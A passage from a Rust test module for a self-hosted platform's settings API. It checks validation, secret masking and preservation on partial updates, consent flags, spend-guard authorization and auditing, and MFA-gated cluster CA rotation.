                AgentSandboxSettings {
                    max_cpu_limit: Some(0.0),
                    ..Default::default()
                },
            ),
            (
                "max_cpu_limit",
                AgentSandboxSettings {
                    max_cpu_limit: Some(f64::NAN),
                    ..Default::default()
                },
            ),
            (
                "max_memory_limit_mb",
                AgentSandboxSettings {
                    max_memory_limit_mb: Some(5),
                    ..Default::default()
                },
            ),
            (
                "max_pids_limit",
                AgentSandboxSettings {
                    max_pids_limit: Some(0),
                    ..Default::default()
                },
            ),
            (
                "max_sandboxes_per_user",
                AgentSandboxSettings {
                    max_sandboxes_per_user: Some(0),
                    ..Default::default()
                },
            ),
        ];
        for (field, settings) in bad {
            let problem = validate_sandbox_limits(&settings).expect_err(field);
            assert_eq!(problem.status_code, StatusCode::BAD_REQUEST, "{field}");
            let detail = problem
                .body
                .get("detail")
                .and_then(|d| d.as_str())
                .unwrap_or_default();
            assert!(
                detail.contains(field),
                "{field}: detail must name the setting, got {detail:?}"
            );
        }
    }

    #[test]
    fn sandbox_backend_setting_accepts_the_three_public_backends() {
        assert!(validate_sandbox_backend(None).is_ok());
        for backend in ["docker", "firecracker", "microsandbox", " microsandbox "] {
            assert!(
                validate_sandbox_backend(Some(backend)).is_ok(),
                "{backend:?} must be accepted"
            );
        }
        for backend in ["local", "libkrun", ""] {
            let problem = validate_sandbox_backend(Some(backend))
                .expect_err("non-public backends must be rejected");
            assert_eq!(problem.status_code, StatusCode::BAD_REQUEST);
        }
    }

    #[test]
    fn partial_settings_updates_preserve_omitted_fields_and_respect_explicit_values() {
        let mut current = AppSettings {
            preview_domain: "apps.example.test".into(),
            ..Default::default()
        };
        current.multi_node.cluster_ca_cert_pem = Some("stored-cert".into());
        current.multi_node.cluster_ca_key_encrypted = Some("stored-encrypted-key".into());
        current.multi_node.node_failover_after_secs = Some(120);
        let mut submitted =
            serde_json::json!({ "multi_node": { "node_failover_after_secs": null } });
        fill_omitted_settings(&mut submitted, serde_json::to_value(&current).unwrap());
        let merged: AppSettings = serde_json::from_value(submitted).unwrap();
        assert_eq!(merged.preview_domain, "apps.example.test");
        assert_eq!(
            merged.multi_node.cluster_ca_cert_pem,
            current.multi_node.cluster_ca_cert_pem
        );
        assert_eq!(
            merged.multi_node.cluster_ca_key_encrypted,
            current.multi_node.cluster_ca_key_encrypted
        );
        assert_eq!(merged.multi_node.node_failover_after_secs, None);

        let mut supplied = serde_json::json!({ "nested": { "value": false }, "list": [] });
        fill_omitted_settings(
            &mut supplied,
            serde_json::json!({ "nested": { "value": true, "keep": 7 }, "list": [1, 2] }),
        );
        assert_eq!(
            supplied,
            serde_json::json!({ "nested": { "value": false, "keep": 7 }, "list": [] })
        );
    }

    /// A stored document with every masked, elided, or presence-sensitive
    /// field set to a non-default value, so a round-trip that drops or resets
    /// any of them shows up as a diff.
    fn fully_populated_settings() -> AppSettings {
        let mut s = AppSettings {
            external_url: Some("https://temps.example.test".into()),
            console_version: Some("v9.9.9".into()),
            plugin_installation_reporting_enabled: true,
            anonymous_telemetry_enabled: Some(false),
            trust_loopback_forwarded_ip: Some(true),
            self_update: Some(temps_core::SelfUpdateSettings {
                enabled: false,
                ..Default::default()
            }),
            ..Default::default()
        };
        s.on_demand_tls = OnDemandTlsSettings {
            enabled: true,
            zone: Some("deploy.example.test".into()),
            max_concurrent: 5,
            hourly_cap: 25,
            deployment_url_mode: "redirect_to_env".into(),
        };
        s.dns_provider.cloudflare_api_key = Some("stored-cloudflare-key".into());
        s.docker_registry.password = Some("stored-registry-password".into());
        s.agent_sandbox.api_key_encrypted = Some("stored-legacy-ciphertext".into());
        s.agent_sandbox.sandbox_backend = Some("docker".into());
        s.agent_sandbox.providers.insert(
            "provider-a".into(),
            ProviderConfig {
                auth_type: "api_key".into(),
                credentials_encrypted: Some("stored-provider-ciphertext".into()),
                extra: serde_json::json!({ "credential_verified": true }),
                ..Default::default()
            },
        );
        s.preview_gateway.shared_secret = "stored-gateway-secret".into();
        s.multi_node.join_token_hash = Some("stored-join-token-hash".into());
        s.multi_node.cluster_ca_cert_pem = Some("stored-ca-cert".into());
        s.multi_node.cluster_ca_key_encrypted = Some("stored-ca-key".into());
        s.multi_node.wg_endpoint = Some("203.0.113.1:20517".into());
        s.multi_node.node_failover_after_secs = None;
        s.monitoring.clickhouse_url = Some("http://user:pass@clickhouse:8123".into());
        s.geo.maxmind_license_key_encrypted = Some("stored-maxmind-ciphertext".into());
        s.cloud.telemetry_enabled = true;
        s.cloud.backups_enabled = true;
        s
    }

    /// Run a `PUT /settings` body through the same merge steps, in the same
    /// order, as `update_settings` (minus the guard authorization and the
    /// MaxMind encryption, which need live services and change nothing when
    /// no plaintext key is submitted).
    fn merge_settings_put(mut body: serde_json::Value, stored: &AppSettings) -> AppSettings {
        discard_plugin_reporting_consent(&mut body);
        let cloud_fields_sent = CloudFieldsSent::from_settings_body(&body);
        let node_failover_sent =
            SettingsWritePresence::from_settings_body(&body).node_failover_after_secs_sent();
        fill_omitted_settings(&mut body, serde_json::to_value(stored).unwrap());
        let mut merged: AppSettings = serde_json::from_value(body).unwrap();
        preserve_cloud_settings_not_sent_by_every_client(&mut merged, stored, cloud_fields_sent);
        preserve_self_recorded_fields(&mut merged, stored);
        preserve_omitted_security_fields(&mut merged, stored);
        merged.plugin_installation_reporting_enabled = stored.plugin_installation_reporting_enabled;
        merged.anonymous_telemetry_enabled = stored.anonymous_telemetry_enabled;
        preserve_provider_credential_proof(&mut merged, stored);
        merged.geo.preserve_recorded_state(&stored.geo);
        preserve_masked_secrets(&mut merged, stored, node_failover_sent);
        merged
    }

    /// Issue #1171: a PUT that never mentions `on_demand_tls` must not reset
    /// it to disabled, or the next restart stops issuing certificates.
    #[test]
    fn settings_put_without_on_demand_tls_keeps_the_stored_value() {
        let stored = fully_populated_settings();
        let merged = merge_settings_put(
            serde_json::json!({ "external_url": "https://changed.example.test" }),
            &stored,
        );
        assert_eq!(
            merged.external_url.as_deref(),
            Some("https://changed.example.test")
        );
        assert_eq!(
            serde_json::to_value(&merged.on_demand_tls).unwrap(),
            serde_json::to_value(&stored.on_demand_tls).unwrap()
        );
    }

    #[test]
    fn settings_get_response_reports_on_demand_tls() {
        let stored = fully_populated_settings();
        let response = serde_json::to_value(AppSettingsResponse::from(stored.clone())).unwrap();
        assert_eq!(
            response["on_demand_tls"],
            serde_json::to_value(&stored.on_demand_tls).unwrap()
        );
    }

    /// Writing back exactly what `GET /settings` returned must leave the
    /// stored document unchanged: no secret replaced by its mask, no elided
    /// field wiped, no presence-sensitive value reset to its default.
    #[test]
    fn settings_get_then_put_round_trip_is_lossless() {
        let stored = fully_populated_settings();
        let get_body = serde_json::to_value(AppSettingsResponse::from(stored.clone())).unwrap();
        assert_eq!(
            get_body["dns_provider"]["cloudflare_api_key"], "******",
            "fixture must exercise the echoed-mask path"
        );
        let merged = merge_settings_put(get_body, &stored);
        assert_eq!(
            serde_json::to_value(&merged).unwrap(),
            serde_json::to_value(&stored).unwrap()
        );
    }

    #[test]
    fn masked_secrets_are_replaced_only_when_the_client_echoes_the_mask() {
        let stored = fully_populated_settings();
        let mut incoming = stored.clone();
        incoming.dns_provider.cloudflare_api_key = Some("new-cloudflare-key".into());
        incoming.docker_registry.password = Some("******".into());
        incoming.monitoring.clickhouse_url = Some("   ".into());
        incoming.multi_node.cluster_ca_key_encrypted = Some("forged-ca-key".into());
        incoming.multi_node.wg_endpoint = Some("198.51.100.66:51820".into());
        preserve_masked_secrets(&mut incoming, &stored, false);
        assert_eq!(
            incoming.dns_provider.cloudflare_api_key.as_deref(),
            Some("new-cloudflare-key")
        );
        assert_eq!(
            incoming.docker_registry.password,
            stored.docker_registry.password
        );
        assert_eq!(
            incoming.monitoring.clickhouse_url,
            stored.monitoring.clickhouse_url
        );
        assert_eq!(
            incoming.multi_node.cluster_ca_key_encrypted,
            stored.multi_node.cluster_ca_key_encrypted
        );
        // `--wg-endpoint` is the flag's, never the settings API's.
        assert_eq!(
            incoming.multi_node.wg_endpoint,
            stored.multi_node.wg_endpoint
        );
    }

    #[test]
    fn generic_settings_write_cannot_change_anonymous_telemetry_consent() {
        // An admin turned telemetry off from Settings › Telemetry; a client
        // that round-trips the whole document with the field flipped (or
        // omitted) must not undo that decision.
        let stored = AppSettings {
            anonymous_telemetry_enabled: Some(false),
            ..Default::default()
        };
        for body in [
            serde_json::json!({
                "preview_domain": "apps.example.test",
                "anonymous_telemetry_enabled": true
            }),
            serde_json::json!({ "preview_domain": "apps.example.test" }),
        ] {
            let merged = merge_settings_put(body, &stored);
            assert_eq!(merged.anonymous_telemetry_enabled, Some(false));
        }
    }

    #[test]
    fn generic_settings_write_cannot_enable_plugin_reporting() {
        let mut body = serde_json::json!({
            "preview_domain": "apps.example.test",
            "plugin_installation_reporting_enabled": true
        });
        discard_plugin_reporting_consent(&mut body);
        assert!(body.get("plugin_installation_reporting_enabled").is_none());
        let mut incoming: AppSettings = serde_json::from_value(body).expect("settings body");
        let current = AppSettings::default();
        incoming.plugin_installation_reporting_enabled =
            current.plugin_installation_reporting_enabled;
        assert!(!incoming.plugin_installation_reporting_enabled);
    }
    use temps_core::{
        AgentSandboxSettings, AiChatLimitsSettings, AiWorkspaceFileLimitsSettings, AppSettings,
        ProviderConfig,
    };

    #[test]
    fn general_settings_put_cannot_forge_or_replace_provider_verification() {
        let mut current = AppSettings::default();
        current.agent_sandbox.providers.insert(
            "opencode".into(),
            ProviderConfig {
                auth_type: "config_file".into(),
                credentials_encrypted: Some("encrypted-good".into()),
                extra: serde_json::json!({ "credential_verified": true, "preserved": 1 }),
                ..Default::default()
            },
        );
        let mut incoming = AppSettings::default();
        incoming.agent_sandbox.providers.insert(
            "opencode".into(),
            ProviderConfig {
                auth_type: "api_key".into(),
                credentials_encrypted: Some("encrypted-bad".into()),
                extra: serde_json::json!({ "credential_verified": false, "user_setting": 2 }),
                ..Default::default()
            },
        );
        incoming.agent_sandbox.providers.insert(
            "new".into(),
            ProviderConfig {
                credentials_encrypted: Some("forged".into()),
                extra: serde_json::json!({ "credential_verified": true }),
                ..Default::default()
            },
        );
        preserve_provider_credential_proof(&mut incoming, &current);
        let saved = &incoming.agent_sandbox.providers["opencode"];
        assert_eq!(
            saved.credentials_encrypted.as_deref(),
            Some("encrypted-good")
        );
        assert_eq!(saved.auth_type, "config_file");
        assert_eq!(saved.extra["credential_verified"], true);
        assert_eq!(saved.extra["user_setting"], 2);
        let forged = &incoming.agent_sandbox.providers["new"];
        assert_eq!(forged.credentials_encrypted, None);
        assert!(forged.extra.get("credential_verified").is_none());
    }

    fn rotation_test_user(mfa_enabled: bool) -> temps_entities::users::Model {
        let now = chrono::Utc::now();
        temps_entities::users::Model {
            id: 71,
            name: "CA Rotation Admin".to_string(),
            email: "ca-rotation@example.com".to_string(),
            password_hash: None,
            email_verified: true,
            email_verification_token: None,
            email_verification_expires: None,
            password_reset_token: None,
            password_reset_expires: None,
            must_change_password: false,
            deleted_at: None,
            mfa_secret: mfa_enabled.then(|| "test-secret".to_string()),
            mfa_enabled,
            mfa_recovery_codes: None,
            oidc_subject: None,
            oidc_provider_id: None,
            created_at: now,
            updated_at: now,
        }
    }

    // ── ADR-042 §6.3 review, Finding 2: the bulk-activation money guard ──

    fn guard_principal(role: temps_auth::Role) -> temps_auth::AuthContext {
        temps_auth::AuthContext::new_session(rotation_test_user(false), role)
    }

    fn cloud_with_factor(factor: Option<f32>) -> CloudSettings {
        CloudSettings {
            telemetry_bulk_anomaly_factor: factor,
            ..Default::default()
        }
    }

    #[test]
    fn an_anomaly_factor_above_the_ceiling_is_rejected_rather_than_silently_clamped() {
        // Clamping on read alone would leave the settings page echoing back a
        // number that is not in force — and lying in the one direction that
        // costs money, because the operator would believe they had widened the
        // spend guard when they had not.
        for absurd in [
            MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR + 0.5,
            1_000.0,
            f32::INFINITY,
            f32::NAN,
        ] {
            let problem = validate_bulk_activation_guards(&cloud_with_factor(Some(absurd)))
                .expect_err("an out-of-range factor must be refused");
            assert_eq!(
                problem.status_code,
                StatusCode::BAD_REQUEST,
                "{absurd} must be a 400"
            );
            let body = format!("{problem:?}");
            assert!(body.contains("telemetry_bulk_anomaly_factor"), "{body}");
            // The operator must learn the range *and* what to do when their
            // project genuinely needs a wider margin than the ceiling allows.
            assert!(body.contains("maximum"), "{body}");
            assert!(body.contains("Cloud telemetry status card"), "{body}");
        }
    }

    #[test]
    fn a_factor_below_the_floor_is_rejected_too_and_the_whole_range_is_accepted() {
        assert_eq!(
            validate_bulk_activation_guards(&cloud_with_factor(Some(0.5)))
                .expect_err("below the floor every project pauses on its first chunk")
                .status_code,
            StatusCode::BAD_REQUEST
        );

        for usable in [
            None,
            Some(MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR),
            Some(temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR),
            Some(MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR),
        ] {
            assert!(
                validate_bulk_activation_guards(&cloud_with_factor(usable)).is_ok(),
                "{usable:?} is inside the tuning range and must be accepted"
            );
        }
    }

    #[test]
    fn widening_the_money_guard_needs_an_instance_admin_but_narrowing_does_not() {
        let previous = BulkActivationGuards::from(&cloud_with_factor(Some(5.0)));
        let wider = BulkActivationGuards::from(&cloud_with_factor(Some(40.0)));
        let narrower = BulkActivationGuards::from(&cloud_with_factor(Some(2.0)));

        // A settings:write holder who is not an instance admin may tighten the
        // guard — an operator watching a bill run away must never have to find
        // an administrator before they can stop it — but not loosen it.
        let ordinary = guard_principal(temps_auth::Role::User);
        assert!(authorize_bulk_activation_guard_change(&ordinary, previous, narrower).is_ok());
        assert!(authorize_bulk_activation_guard_change(&ordinary, previous, previous).is_ok());

        let refused = authorize_bulk_activation_guard_change(&ordinary, previous, wider)
            .expect_err("loosening the money guard is an instance-admin action");
        assert_eq!(refused.status_code, StatusCode::FORBIDDEN);
        let body = format!("{refused:?}");
        assert!(body.contains("required_role"), "{body}");
        assert!(body.contains("requested_anomaly_factor"), "{body}");

        // The bar the operator bulk-activation endpoints already use.
        for role in [temps_auth::Role::Admin, temps_auth::Role::PlatformAdmin] {
            assert!(
                authorize_bulk_activation_guard_change(
                    &guard_principal(role.clone()),
                    previous,
                    wider
                )
                .is_ok(),
                "{role} runs the instance and may widen its own spend guard"
            );
        }
    }

    #[test]
    fn omitting_the_factor_is_not_treated_as_a_change_let_alone_a_widening() {
        // The settings PUT replaces the whole document, so a client built before
        // this field existed sends `None`. `None` and `Some(5.0)` are the same
        // guard, and refusing every such save with a 403 would break every
        // unrelated settings write on the instance.
        let unset = BulkActivationGuards::from(&cloud_with_factor(None));
        let explicit_default = BulkActivationGuards::from(&cloud_with_factor(Some(
            temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR,
        )));

        assert_eq!(unset, explicit_default);
        assert!(authorize_bulk_activation_guard_change(
            &guard_principal(temps_auth::Role::User),
            unset,
            explicit_default
        )
        .is_ok());
    }

    #[test]
    fn a_guard_change_is_audited_with_both_sides_and_the_direction() {
        // `SETTINGS_UPDATED` carries no field-level values, so under it alone a
        // widened spend ceiling is indistinguishable from a display-name change.
        let event = CloudTelemetryBulkGuardUpdatedAudit {
            context: AuditContext {
                user_id: 71,
                ip_address: Some("127.0.0.1".to_string()),
                user_agent: "test".to_string(),
            },
            previous_anomaly_factor: 5.0,
            new_anomaly_factor: 40.0,
            previous_rate_limit_spans_per_sec: Some(5_000),
            new_rate_limit_spans_per_sec: None,
            widened_anomaly_factor: true,
        };

        assert_eq!(
            AuditOperation::operation_type(&event),
            "CLOUD_TELEMETRY_BULK_GUARD_UPDATED"
        );
        let serialized = AuditOperation::serialize(&event).expect("must serialize");
        assert!(
            serialized.contains("\"previous_anomaly_factor\":5.0"),
            "{serialized}"
        );
        assert!(
            serialized.contains("\"new_anomaly_factor\":40.0"),
            "{serialized}"
        );
        assert!(
            serialized.contains("\"previous_rate_limit_spans_per_sec\":5000"),
            "{serialized}"
        );
        assert!(
            serialized.contains("\"new_rate_limit_spans_per_sec\":null"),
            "{serialized}"
        );
        assert!(
            serialized.contains("\"widened_anomaly_factor\":true"),
            "{serialized}"
        );
    }

    #[test]
    fn a_throttle_change_alone_is_still_a_recordable_guard_change() {
        // The rate limit is the other half of what governs how fast a paid-for
        // activation spends. A change to it with the factor untouched must not
        // fall through the "did anything change" check.
        let previous = BulkActivationGuards::from(&CloudSettings {
            telemetry_bulk_rate_limit_spans_per_sec: Some(1_000),
            ..Default::default()
        });
        let next = BulkActivationGuards::from(&CloudSettings {
            telemetry_bulk_rate_limit_spans_per_sec: None,
            ..Default::default()
        });

        assert_ne!(previous, next);
        // …and removing a throttle is not a widening of the money guard, so it
        // stays under ordinary settings:write.
        assert!(authorize_bulk_activation_guard_change(
            &guard_principal(temps_auth::Role::User),
            previous,
            next
        )
        .is_ok());
    }

    fn disconnected_authorizer() -> temps_auth::DefaultSensitiveActionAuthorizer {
        temps_auth::DefaultSensitiveActionAuthorizer::new(Arc::new(
            sea_orm::DatabaseConnection::Disconnected,
        ))
    }

    #[tokio::test]
    async fn cluster_ca_rotation_rejects_machine_credentials_even_with_permission() {
        let auth = temps_auth::AuthContext::new_api_key(
            rotation_test_user(true),
            None,
            Some(vec![
                temps_auth::Permission::SettingsWrite,
                temps_auth::Permission::ClusterCaRotate,
            ]),
            "rotation-key".to_string(),
            19,
        );

        let error = require_cluster_ca_rotation_authorization(&disconnected_authorizer(), &auth)
            .await
            .expect_err("API keys must never rotate the cluster CA");
        assert_eq!(error.status_code, StatusCode::FORBIDDEN);
        assert_eq!(
            error.body.get("error_code"),
            Some(&serde_json::json!(
                "CLUSTER_CA_ROTATION_BROWSER_SESSION_REQUIRED"
            ))
        );
    }

    #[tokio::test]
    async fn cluster_ca_rotation_rejects_platform_administrators() {
        let auth = temps_auth::AuthContext::new_persisted_session(
            rotation_test_user(true),
            temps_auth::Role::PlatformAdmin,
            24,
        );

        let error = require_cluster_ca_rotation_authorization(&disconnected_authorizer(), &auth)
            .await
            .expect_err("platform administrators must not rotate the cluster CA");
        assert_eq!(error.status_code, StatusCode::FORBIDDEN);
        assert_eq!(
            error.body.get("error_code"),
            Some(&serde_json::json!("CLUSTER_CA_ROTATION_ADMIN_REQUIRED"))
        );
    }

    #[tokio::test]
    async fn cluster_ca_rotation_requires_mfa_enrollment() {
        let auth = temps_auth::AuthContext::new_persisted_session(
            rotation_test_user(false),
            temps_auth::Role::Admin,
            23,
        );

        let error = require_cluster_ca_rotation_authorization(&disconnected_authorizer(), &auth)
            .await
            .expect_err("an admin without MFA must not rotate the cluster CA");
        assert_eq!(error.status_code, StatusCode::FORBIDDEN);
        assert_eq!(
            error.body.get("error_code"),
            Some(&serde_json::json!("CLUSTER_CA_ROTATION_MFA_REQUIRED"))
        );
    }

    /// An operator's decision to forbid console updates must survive a save
    /// from a client that has never heard of the field.
    ///
    /// `AppSettings` deserializes with `#[serde(default)]` and the PUT replaces
    /// the whole document, so an omitted `self_update` used to come back as
    /// "enabled" — silently re-arming the server's ability to replace its own
    /// binary. Regression test for that: absence means "leave it alone".
    #[test]
    fn omitting_self_update_preserves_the_stored_value() {
        let current = AppSettings {
            self_update: Some(temps_core::SelfUpdateSettings {
                enabled: false,
                channel: Some("stable".to_string()),
            }),
            ..AppSettings::default()
        };
        // What serde produces for a body that never mentioned the field.
        let mut incoming = AppSettings {
            self_update: None,
            ..AppSettings::default()
        };

        preserve_omitted_security_fields(&mut incoming, &current);

        let effective = incoming.self_update();
        assert!(
            !effective.enabled,
            "an omitted self_update must not re-enable console updates"
        );
        assert_eq!(effective.channel.as_deref(), Some("stable"));
    }

    /// An explicit value still wins — this is a preserve, not a freeze.
    #[test]
    fn an_explicit_self_update_value_overrides_the_stored_one() {
        let current = AppSettings {
            self_update: Some(temps_core::SelfUpdateSettings {
                enabled: false,
                channel: None,
            }),
            ..AppSettings::default()
        };
        let mut incoming = AppSettings {
            self_update: Some(temps_core::SelfUpdateSettings {
                enabled: true,
                channel: Some("beta".to_string()),
            }),
            ..AppSettings::default()
        };

        preserve_omitted_security_fields(&mut incoming, &current);

        let effective = incoming.self_update();
        assert!(effective.enabled);
        assert_eq!(effective.channel.as_deref(), Some("beta"));
    }

    /// A never-configured install reads as the documented default.
    #[test]
    fn absent_self_update_reads_as_enabled_by_default() {
        let settings = AppSettings::default();
        assert!(settings.self_update.is_none());
        assert!(settings.self_update().enabled);
        assert_eq!(settings.self_update().channel, None);
    }

    #[test]
    fn omitted_forwarded_ip_trust_preserves_admin_choice() {
        let current = AppSettings {
            trust_loopback_forwarded_ip: Some(true),
            ..AppSettings::default()
        };
        let mut incoming: AppSettings = serde_json::from_value(serde_json::json!({}))
            .expect("an older settings client omits the new field");

        preserve_omitted_security_fields(&mut incoming, &current);

        assert!(incoming.trust_loopback_forwarded_ip());
    }

    #[test]
    fn explicit_forwarded_ip_trust_false_disables_admin_choice() {
        let current = AppSettings {
            trust_loopback_forwarded_ip: Some(true),
            ..AppSettings::default()
        };
        let mut incoming = AppSettings {
            trust_loopback_forwarded_ip: Some(false),
            ..AppSettings::default()
        };

        preserve_omitted_security_fields(&mut incoming, &current);

        assert!(!incoming.trust_loopback_forwarded_ip());
        assert!(!AppSettingsResponse::from(incoming).trust_loopback_forwarded_ip);
    }

    #[test]
    fn generic_settings_update_cannot_enable_cloud_exports() {
        let current = AppSettings::default();
        let mut incoming = AppSettings::default();
        incoming.cloud.telemetry_enabled = true;
        incoming.cloud.backups_enabled = true;
        incoming.cloud.notifications_enabled = true;
        // ADR-045 §5: console access is exactly as unwritable through this
        // endpoint as the three consent flags above -- it is a
        // resource-specific `PATCH /cloud/features` decision (or the
        // bootstrap default), never a side effect of an unrelated settings
        // save.
        incoming.cloud.console_access_enabled = true;
        incoming.cloud.telemetry_consent_bootstrapped = true;

        preserve_cloud_settings_not_sent_by_every_client(
            &mut incoming,
            &current,
            CloudFieldsSent::default(),
        );

        assert!(!incoming.cloud.telemetry_enabled);
        assert!(!incoming.cloud.backups_enabled);
        assert!(!incoming.cloud.notifications_enabled);
        assert!(!incoming.cloud.console_access_enabled);
        assert!(!incoming.cloud.telemetry_consent_bootstrapped);
    }

    #[test]
    fn generic_settings_update_preserves_existing_cloud_export_consent() {
        let mut current = AppSettings::default();
        current.cloud.telemetry_enabled = true;
        current.cloud.backups_enabled = true;
        current.cloud.notifications_enabled = true;
        current.cloud.console_access_enabled = true;
        current.cloud.telemetry_consent_bootstrapped = true;
        let mut incoming = AppSettings::default();

        preserve_cloud_settings_not_sent_by_every_client(
            &mut incoming,
            &current,
            CloudFieldsSent::default(),
        );

        assert!(incoming.cloud.telemetry_enabled);
        assert!(incoming.cloud.backups_enabled);
        assert!(incoming.cloud.notifications_enabled);
        assert!(incoming.cloud.console_access_enabled);
        assert!(incoming.cloud.telemetry_consent_bootstrapped);
    }

    /// A settings row whose operator-tuned Cloud fields have all been moved off
    /// their defaults, so that "reset to default" is visible as a failure.
    fn stored_settings_with_tuned_cloud_fields() -> AppSettings {
        let mut current = AppSettings::default();
        // ADR-041: a bigger outbox than the 512 MiB default, and a Cloud that
        // is not the production one.
        current.cloud.backend_url = "https://cloud.staging.example".to_string();
        current.cloud.telemetry_outbox_max_bytes = 1024 * 1024 * 1024;
        // ADR-042: a narrowed spend guard and a throttled backfill.
        current.cloud.telemetry_bulk_anomaly_factor = Some(2.0);
        current.cloud.telemetry_bulk_rate_limit_spans_per_sec = Some(5_000);
        current
    }

    /// Mirror exactly what `update_settings` does with a request body: read key
    /// presence off the raw JSON, deserialize, then merge the stored `cloud`
    /// block in. Testing from the wire format is the point — the bug being
    /// guarded against lives in the gap between "key absent" and "value equals
    /// the default", which no test built from an `AppSettings` value could see.
    fn merge_settings_body(body: serde_json::Value, current: &AppSettings) -> AppSettings {
        let sent = CloudFieldsSent::from_settings_body(&body);
        let mut incoming: AppSettings =
            serde_json::from_value(body).expect("settings body should deserialize");
        preserve_cloud_settings_not_sent_by_every_client(&mut incoming, current, sent);
        incoming
    }

    /// The console's own save has never carried a `cloud` block, and no client
    /// built before ADR-041/ADR-042 does either. Such a save must leave every
    /// operator-tuned Cloud field exactly as stored, not reset it to the
    /// build-time default.
    #[test]
    fn a_settings_save_that_omits_the_cloud_block_keeps_the_stored_spend_guards() {
        let current = stored_settings_with_tuned_cloud_fields();

        // A realistic unrelated save: some other settings page, no `cloud` key.
        let merged = merge_settings_body(
            serde_json::json!({
                "preview_domain": "apps.example.test",
                "insecure_tls": false,
            }),
            &current,
        );

        // ADR-042 §6.3 — the narrowed money guard survives.
        assert_eq!(merged.cloud.telemetry_bulk_anomaly_factor, Some(2.0));
        assert_eq!(merged.cloud.effective_bulk_anomaly_factor(), 2.0);
        assert_ne!(
            merged.cloud.effective_bulk_anomaly_factor(),
            temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR
        );
        // ADR-042 §3 — the throttle survives.
        assert_eq!(
            merged.cloud.telemetry_bulk_rate_limit_spans_per_sec,
            Some(5_000)
        );
        // ADR-041 — the outbox ceiling and the Cloud destination survive.
        assert_eq!(merged.cloud.telemetry_outbox_max_bytes, 1024 * 1024 * 1024);
        assert_eq!(merged.cloud.backend_url, "https://cloud.staging.example");
    }

    /// The same save must also not *look* like a guard change, or an operator
    /// holding only `settings:write` would be refused with a 403 (widening 2x
    /// back to the 5x default is instance-admin only) and the audit log would
    /// record a spend-guard change that nobody made.
    #[test]
    fn a_settings_save_that_omits_the_cloud_block_is_not_a_guard_change() {
        let current = stored_settings_with_tuned_cloud_fields();

        let merged = merge_settings_body(
            serde_json::json!({ "preview_domain": "apps.example.test" }),
            &current,
        );

        assert_eq!(
            BulkActivationGuards::from(&merged.cloud),
            BulkActivationGuards::from(&current.cloud)
        );
    }

    /// Preserving is not freezing: a client that names a field still writes it,
    /// including writing it *back to its default value* — the case a
    /// "value equals the default means absent" heuristic would silently drop.
    #[test]
    fn an_explicitly_sent_cloud_field_still_overrides_the_stored_one() {
        let current = stored_settings_with_tuned_cloud_fields();

        let merged = merge_settings_body(
            serde_json::json!({
                "cloud": {
                    "telemetry_bulk_anomaly_factor": 7.5,
                    "backend_url": "https://app.temps.sh",
                }
            }),
            &current,
        );

        assert_eq!(merged.cloud.telemetry_bulk_anomaly_factor, Some(7.5));
        // Explicitly restoring the default destination is a real write.
        assert_eq!(merged.cloud.backend_url, "https://app.temps.sh");
        // The two keys this body did not name are still preserved.
        assert_eq!(
            merged.cloud.telemetry_bulk_rate_limit_spans_per_sec,
            Some(5_000)
        );
        assert_eq!(merged.cloud.telemetry_outbox_max_bytes, 1024 * 1024 * 1024);
    }

    /// An explicit `null` is a value, not an omission: it is how a client
    /// removes the backfill throttle and returns the anomaly factor to the
    /// documented default.
    #[test]
    fn an_explicit_null_clears_a_cloud_field_instead_of_preserving_it() {
        let current = stored_settings_with_tuned_cloud_fields();

        let merged = merge_settings_body(
            serde_json::json!({
                "cloud": {
                    "telemetry_bulk_rate_limit_spans_per_sec": null,
                    "telemetry_bulk_anomaly_factor": null,
                }
            }),
            &current,
        );

        assert_eq!(merged.cloud.telemetry_bulk_rate_limit_spans_per_sec, None);
        assert_eq!(merged.cloud.telemetry_bulk_anomaly_factor, None);
        assert_eq!(
            merged.cloud.effective_bulk_anomaly_factor(),
            temps_core::DEFAULT_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR
        );
        // Still scoped: the unnamed ADR-041 fields are untouched.
        assert_eq!(merged.cloud.telemetry_outbox_max_bytes, 1024 * 1024 * 1024);
        assert_eq!(merged.cloud.backend_url, "https://cloud.staging.example");
    }

    /// `PUT /settings` replaces the whole document, so an absent
    /// `node_failover_after_secs` must be told apart from an explicit `null`.
    #[test]
    fn node_failover_grace_presence_is_read_off_the_wire() {
        let sent = |body: serde_json::Value| {
            SettingsWritePresence::from_settings_body(&body).node_failover_after_secs_sent()
        };

        assert!(!sent(serde_json::json!({})));
        assert!(!sent(
            serde_json::json!({ "multi_node": { "require_mtls": true } })
        ));
        assert!(!sent(serde_json::json!({ "multi_node": null })));
        assert!(sent(serde_json::json!({
            "multi_node": { "node_failover_after_secs": 600 }
        })));

        // Explicit null = "disable automatic failover": present, with no value.
        let disabled = SettingsWritePresence::from_settings_body(&serde_json::json!({
            "multi_node": { "node_failover_after_secs": null }
        }));
        assert!(disabled.node_failover_after_secs_sent());
        assert_eq!(
            disabled.multi_node.and_then(|m| m.node_failover_after_secs),
            Some(None)
        );

        // A body the typed view cannot read reports nothing as sent; the full
        // `AppSettings` deserialization is what rejects it.
        assert!(!sent(serde_json::json!({ "multi_node": "not-an-object" })));
        assert!(!sent(serde_json::json!({
            "multi_node": { "node_failover_after_secs": "soon" }
        })));
    }

    #[test]
    fn cloud_field_presence_is_read_per_key_from_the_request_body() {
        let nothing = CloudFieldsSent::from_settings_body(&serde_json::json!({}));
        assert_eq!(nothing, CloudFieldsSent::default());

        // A `cloud` block that exists but names no operator-tuned field (what a
        // client that only knows about the consent flags would send).
        let consent_only = CloudFieldsSent::from_settings_body(&serde_json::json!({
            "cloud": { "telemetry_enabled": true }
        }));
        assert_eq!(consent_only, CloudFieldsSent::default());

        let outbox_only = CloudFieldsSent::from_settings_body(&serde_json::json!({
            "cloud": { "telemetry_outbox_max_bytes": 1024 }
        }));
        assert!(outbox_only.telemetry_outbox_max_bytes);
        assert!(!outbox_only.backend_url);
        assert!(!outbox_only.telemetry_bulk_anomaly_factor);
        assert!(!outbox_only.telemetry_bulk_rate_limit_spans_per_sec);
    }

    /// The stored value and the effective value must be the same number.
    ///
    /// The runtime clamps on read, so an out-of-range value could never break
